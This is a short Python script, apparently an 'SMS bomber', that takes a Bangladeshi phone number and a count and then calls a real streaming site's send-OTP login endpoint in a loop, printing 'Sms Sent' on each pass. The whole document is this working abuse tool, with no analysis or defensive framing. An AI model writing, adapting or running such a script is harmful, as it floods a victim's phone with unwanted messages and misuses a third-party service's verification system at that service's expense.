import requests

# GET
number=str(input("Enter your number : "))
api="https://www.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"

amount=int(input(" Enter your amount : "))

for i in range(amount):

    requests.get(api)
    print(str(i+1)+"Sms Sent")